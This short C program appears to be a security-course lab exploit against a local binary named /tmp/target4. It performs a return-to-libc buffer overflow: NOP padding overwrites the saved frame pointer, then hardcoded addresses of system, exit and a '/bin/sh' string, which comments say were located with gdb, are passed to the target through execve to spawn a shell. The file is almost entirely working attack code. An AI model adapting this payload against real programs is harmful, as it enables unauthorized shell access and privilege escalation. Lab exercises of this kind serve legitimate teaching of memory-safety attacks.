#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  //we start with 4 NOP's to fill the name array and then an additional 4 NOP's to overwrite the ebp
  //using the terminal, we found the following relevant addresses:
  //system: \xa0\x3d\xe4\xb7
  //exit: \xd0\x79\xe3\xb7
  ///bin/sh: \x0b\x4a\xf6\xb7 (using the find method in gdb)
  //we then append these 3 addresses to our NOP's and assign the full value to args[1]
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xa0\x3d\xe4\xb7\xd0\x79\xe3\xb7\x0b\x4a\xf6\xb7"; 
  args[2] = NULL;
  
  //update the environment to /bin/sh
  env[0] = "/bin/sh";
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


